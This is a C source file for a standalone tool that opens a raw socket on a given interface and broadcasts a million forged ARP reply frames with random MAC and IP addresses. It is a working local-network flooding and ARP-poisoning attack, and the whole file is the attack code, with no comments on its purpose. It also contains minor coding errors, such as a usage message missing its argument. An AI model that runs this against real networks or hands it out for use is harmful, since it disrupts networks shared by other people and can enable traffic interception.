
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <bits/ioctls.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <errno.h>

struct ARP_header {
	unsigned short	hardware;
	unsigned short	protocol;
	unsigned char	hardware_addr_len;
	unsigned char	proto_add_len;
	unsigned short	op;
	unsigned char	src_hw_addr   [6];
	unsigned char	src_proto_addr[4];
	unsigned char	tgt_hw_addr   [6];
	unsigned char	tgt_proto_addr[4];
};


void random_buffer(void * buffer, int size) {
	unsigned char * cbuf = (unsigned char*)buffer;
	while (size--)
		*cbuf++ = rand();
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		fprintf(stderr, "Usage: %s interface\n");
		exit(0);
	}
	
	unsigned char EthernetFrame[64];

	int arp_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL) );
	if (arp_sock < 0) {
		fprintf(stderr,"Failed to create socket!\n");
		exit(-1);
	}

	// Get Interface Index
	struct sockaddr_ll device;
	if ((device.sll_ifindex = if_nametoindex ((const char*)argv[1])) == 0) {
		fprintf(stderr,"if_nametoindex() failed to obtain interface index ");
		exit(-1);
  	}
	fprintf (stderr, "Index for interface %s is %i\n", argv[1], device.sll_ifindex);
	device.sll_family = AF_PACKET;
  	device.sll_halen = htons (6);

	// Keep sending packets with random MAC & IP
	for (int i = 0; i < 1000000; i++) {
		unsigned char src_mac[6], src_ip[4], dst_ip[4];
		random_buffer(src_mac, 6);
		random_buffer(src_ip,  4);
		random_buffer(dst_ip,  4);
		
		// set ARP header
		ARP_header arph ;
		arph.hardware = htons (1);
		arph.protocol = htons (0x800);  //2048
		arph.hardware_addr_len  = 6;
		arph.proto_add_len = 4;
		arph.op = htons(2);
		memcpy(arph.src_hw_addr,    src_mac, sizeof(char)*6);
		memcpy(arph.src_proto_addr, src_ip,  sizeof(char)*4);
		memset(arph.tgt_hw_addr, ~0, 6);
		memcpy(arph.tgt_proto_addr, dst_ip,  sizeof(char)*4);

		memset(EthernetFrame, ~0, 6);
		memcpy(EthernetFrame+6, src_mac, sizeof(char)*6);
		EthernetFrame[12] = ETH_P_ARP / 256;
		EthernetFrame[13] = ETH_P_ARP % 256;

		// copy ARP header to ethernet packet
		memcpy (EthernetFrame + 14, &arph, sizeof (char)*28);
	
		// Send packet to NIC
		if (sendto (arp_sock, EthernetFrame, 42, 0, (struct sockaddr *) &device, sizeof (device)) <= 0)
		{
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
		}
	}

	// close socket
	close(arp_sock);
}

